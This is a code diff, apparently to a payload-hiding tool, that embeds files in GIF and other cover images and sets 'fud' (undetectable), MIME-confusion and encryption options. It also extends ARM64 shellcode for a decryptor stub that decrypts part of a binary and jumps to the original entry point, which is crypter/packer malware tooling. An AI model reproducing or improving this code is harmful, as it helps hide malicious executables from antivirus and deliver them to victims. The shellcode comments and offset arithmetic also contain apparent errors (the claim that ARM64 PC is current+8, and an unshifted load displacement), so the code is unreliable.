@@ -572,7 +572,7 @@ End Function
             'cover_size': len(cover),
             'payload_size': original_size,
             'output_size': len(polyglot),
-            'payload_offset': len(polyglot) - len(payload),
+            'payload_offset': 0 if use_overlay else len(polyglot) - len(payload),
             'encrypted': encrypt,
             'fud_protected': fud,
             'mime_confused': mime_confuse,
@@ -609,7 +609,7 @@ End Function
         if c[:6] not in (b'GIF87a', b'GIF89a'): raise ValueError("Not GIF")
         e = c.rfind(b'\x3b')
         if e == -1: raise ValueError("No terminator")
-        app_name = b'POLYSHLD\x00\x03\x01\x00\x00'
+        app_name = b'POLYSHLD\x00\x03\x01'
         result = c[:e]
         result += b'\x21\xff\x0b' + app_name
         for i in range(0, len(p), 255):
@@ -1620,11 +1620,22 @@ End Function
             shellcode += b'\x00\x04\x00\x91'    # add x0, x0, #1
             shellcode += b'\x21\x04\x00\xD1'    # sub x1, x1, #1
             shellcode += b'\x41\x00\x00\xB5'    # cbnz x1, loop
+            # Jump to original entry: ldr x0, [pc, #offset]; br x0
+            pool_off = 48
+            entry_pool_off = pool_off + 16  # pool[2] at offset 64
+            # ldr x0, [pc, #(entry_pool_off - current_pc)]
+            # PC = current offset + 8 (ARM64 PC is current+8 for literal pool loads)
+            pc_now = len(shellcode)
+            ldr_disp = (entry_pool_off - pc_now) // 4  # scaled by 4
+            shellcode += struct.pack('<I', 0x58000000 | ldr_disp)  # ldr x0, [pc, #off]
+            shellcode += b'\x00\x00\x1F\xD6'    # br x0
             # NOP pad then data pool at offset 48
-            pad_needed = 48 - len(shellcode)
-            shellcode += b'\x1F\x20\x03\xD5' * (pad_needed // 4)
+            pad_needed = pool_off - len(shellcode)
+            if pad_needed > 0:
+                shellcode += b'\x1F\x20\x03\xD5' * (pad_needed // 4)
             shellcode += struct.pack('<Q', encrypt_start_va)  # pool[0]: address to decrypt
             shellcode += struct.pack('<Q', encrypt_size)       # pool[1]: size
+            shellcode += struct.pack('<Q', entry_va)           # pool[2]: original entry
             while len(shellcode) < decryptor_size:
                 shellcode += b'\x1F\x20\x03\xD5'
             shellcode = shellcode[:decryptor_size]
